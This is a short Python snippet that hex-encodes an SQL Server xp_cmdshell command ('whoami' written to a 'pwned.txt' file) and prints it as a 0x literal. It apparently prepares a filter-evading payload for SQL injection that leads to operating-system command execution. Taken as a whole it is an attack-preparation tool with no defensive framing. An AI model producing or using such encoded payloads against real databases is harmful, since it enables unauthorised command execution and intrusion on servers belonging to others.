s = "xp_cmdshell 'whoami > C:\\Windows\\Temp\\pwned.txt'"
hex_value = s.encode('utf-8').hex()
print("0x" + hex_value)
